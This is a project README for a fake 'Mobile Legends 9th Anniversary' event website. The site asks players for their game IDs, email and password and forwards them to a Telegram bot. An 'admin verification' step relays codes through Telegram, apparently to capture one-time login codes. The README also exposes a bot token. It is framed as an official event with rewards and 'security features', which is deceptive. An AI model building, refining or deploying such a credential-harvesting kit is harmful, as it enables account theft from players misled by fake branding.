# Mobile Legends 9th Anniversary Event Website

A premium Node.js web application for Mobile Legends' 9th anniversary event that collects user information through a 4-step form process with redeem code validation and sends the data to Telegram.

## 🎮 Features

- **Premium UI Design**: Mobile Legends themed interface with official branding
- **4-Step Form Process**: 
  - Step 1: User ID and Game ID collection
  - Step 2: Email and password verification
  - Step 3: Anniversary redeem code validation (`M4EVE89X1S2L09Q`)
  - Step 4: Admin verification via Telegram
- **Telegram Integration**: Automatic data forwarding to Telegram using bot API
- **Responsive Design**: Works perfectly on mobile and desktop devices
- **Real-time Validation**: Form validation with visual feedback
- **Smooth Animations**: Premium animations and transitions
- **Security Features**: Form validation and data encryption

## 🚀 Quick Start

### Prerequisites
- Node.js 14+ installed
- Telegram Bot Token (already configured in the project)

### Installation & Running

1. **Install Dependencies**
   ```bash
   npm install
   ```

2. **Start the Server**
   ```bash
   npm start
   ```
   
   Or for development with auto-reload:
   ```bash
   npm run dev
   ```

3. **Access the Website**
   Open your browser and navigate to: `http://localhost:3000`

## 📁 Project Structure

```
mobile-legends-9th-anniversary/
├── server.js              # Express server with API routes
├── package.json           # Project dependencies
├── public/                # Static files
│   ├── index.html         # Step 1: User/Game ID form
│   ├── step2.html         # Step 2: Email/Password form
│   ├── step3.html         # Step 3: Redeem code validation
│   ├── step4.html         # Step 4: Admin verification
│   ├── css/
│   │   └── styles.css     # Premium Mobile Legends themed styles
│   └── js/
│       ├── step1.js       # Step 1 form handling
│       ├── step2.js       # Step 2 form handling
│       ├── step3.js       # Step 3 redeem code validation
│       └── step4.js       # Admin verification status
└── .github/
    └── copilot-instructions.md  # Project documentation
```

## 🔧 Configuration

### Telegram Bot Setup
The Telegram bot is pre-configured with the token: `7865954464:AAFBqmqdfeOSatw7m8MRr2HbJUvqSIbbdAI`

**Important**: Update the `CHAT_ID` in `server.js` (line 12) with your actual Telegram chat ID or channel username:

```javascript
const CHAT_ID = '@your_channel_or_chat_id'; // Replace with your chat ID
```

### Server Configuration
- Default port: 3000
- Can be changed via environment variable: `PORT=8080 npm start`

## 🎨 UI Features

- **Mobile Legends Branding**: Official logo and color scheme
- **Premium Animations**: Smooth transitions and hover effects
- **Form Validation**: Real-time validation with visual feedback
- **Loading States**: Professional loading overlays
- **Success Celebrations**: Confetti animation on completion
- **Responsive Design**: Optimized for all screen sizes

## 📱 Form Flow

1. **Step 1 (index.html)**:
   - User enters their User ID (minimum 3 characters, alphanumeric + underscore)
   - User enters their Game ID (minimum 4 digits, numbers only)
   - Form validates and proceeds to Step 2

2. **Step 2 (step2.html)**:
   - User enters email address (validated format)
   - User enters password (minimum 6 characters with strength indicator) 
   - Form validates and proceeds to Step 3

3. **Step 3 (step3.html)**:
   - User enters the anniversary redeem code: `M4EVE89X1S2L09Q`
   - Code is validated on server side
   - Complete data is sent to Telegram and user proceeds to Step 4

4. **Step 4 (step4.html)**:  
   - Admin verification process via Telegram
   - User sees verification code when admin sends number
   - Success confirmation when admin sends "ok"

## 🔒 Security Features

- Input validation on both client and server side
- Session-based form progression
- Data encryption in transit
- XSS protection through proper input handling

## 🛠️ API Endpoints

- `GET /` - Serves the main page (Step 1)
- `GET /step2` - Serves the second step page
- `POST /api/step1` - Handles User ID and Game ID submission
- `POST /api/step2` - Handles email/password submission  
- `POST /api/step3` - Handles redeem code validation and sends complete data to Telegram
- `GET /api/verification-code/:sessionId` - Gets verification code for user
- `GET /api/verification-status/:sessionId` - Checks verification completion status

## 📞 Support

For technical issues or questions about the Mobile Legends 9th Anniversary event, please check the form validation messages or server logs for debugging information.

## 🎉 Event Details

This website is designed for the Mobile Legends: Bang Bang 9th Anniversary "Nice to Meet You" event, featuring:
- Exclusive anniversary rewards
- Special event participation
- Account verification for reward distribution

---

**🎮 Enjoy the Mobile Legends 9th Anniversary celebration!**